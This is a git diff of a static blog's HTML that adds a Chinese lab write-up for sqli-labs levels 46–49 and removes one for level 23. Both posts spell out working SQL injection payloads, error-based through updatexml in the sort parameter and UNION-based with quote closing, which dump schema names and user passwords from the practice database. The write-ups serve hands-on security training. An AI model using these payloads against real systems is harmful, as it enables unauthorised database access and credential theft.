@@ -71,6 +71,54 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-29" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/02/18/page-29/" class="article-date">
+  <time class="dt-published" datetime="2021-02-18T03:01:52.000Z" itemprop="datePublished">2021-02-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/02/18/page-29/">sqlilabs 46 47 48 49</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>46 数字型注入?sort=1 即可</p>
+<p>用报错注入吧 updatexml</p>
+<p>?sort=1 and updatexml(1,oncat(‘|’,(select group_concat(schema_name)from information_schemata.)),1) 爆数据库 太多了显示不下</p>
+<p>限制一下?sort=1 and updatexml(1,concat(‘|’,(select group_concat(schema_name)from information_schema.schemata limit 0,1)),1) 从第一个开始显示一次显示一个 limit 0，1 更0就可以</p>
+<p>?sort=1 and updatexml(1,concat(‘|’,(select group_concat(table_name)from information_schema.tables where table_schema=’security’)),1) 爆表</p>
+<p>?sort=1 and updatexml(1,concat(‘|’,(select group_concat(column_name)from information_schema.columns where table_schema=’security’ and table_name=’users’)),1) users表的列</p>
+<p>?sort=1 and updatexml(1,concat(‘~’,(select concat_ws(‘|’,id,username,password)from security.users limit 0,1)),1)  爆数据 </p>
+<p>47 就sort=1’ 多一个单引号 </p>
+<p>48 49 关闭了错误回显 没办法用报错注入了 要么盲注 要么神奇的sqlmap</p>
+<p>复制一下地址后面加个sort=1 剩下的和之前的用id的一样了 </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/18/page-29/" data-id="ckroqtflm000hyww7cb0rho8n" data-title="sqlilabs 46 47 48 49" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-28" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/02/15/page-28/" class="article-date">
@@ -500,51 +548,6 @@
 
 
   
-    <article id="post-page-16" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/01/31/page-16/" class="article-date">
-  <time class="dt-published" datetime="2021-01-31T08:35:05.000Z" itemprop="datePublished">2021-01-31</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/01/31/page-16/">sqlilabs 23</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>z这关就很神奇了 末尾的闭合符号– 和#均被过滤  那么只好用单引号闭合 因为单引号里面的不会被执行 所以用and 闭合 ?id=1’ and  ‘1’=’1</p>
-<p>测试回显 ?id=-1’  union select 1,2,3 and ‘1’=’1   显示的消息是 your login name：2 your password：1</p>
-<p>那么就从select1，2，3的2那边入手</p>
-<p>?id=-1’ union select 1,database(),3 and ‘1’=’1 得到库名 security </p>
-<p>?id=-1’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),3 and ‘1’=’1 爆表明</p>
-<p>?id=-1’ union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=’security’ and table_name=’users’),3 and ‘1’=’1 爆列名</p>
-<p>?id=-1’ union select 1,(select group_concat(username,password) from users),3 and ‘1’=’1 查数据</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/01/31/page-16/" data-id="ckroqtfle0007yww7bem6d915" data-title="sqlilabs 23" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -581,6 +584,10 @@
       <ul>
         
           <li>
+            <a href="/2021/07/29/page-81/">BJDCTF2020EasySearch</a>
+          </li>
+        
+          <li>
             <a href="/2021/07/21/page-79/">MRCTF2020Ezpop</a>
           </li>
         
@@ -594,10 +601,6 @@
         
           <li>
             <a href="/2021/07/16/page-76/">羊城杯 2020image_rar</a>
-          </li>
-        
-          <li>
-            <a href="/2021/07/14/page-74/">强网杯2021 threebody</a>
           </li>
         
       </ul>
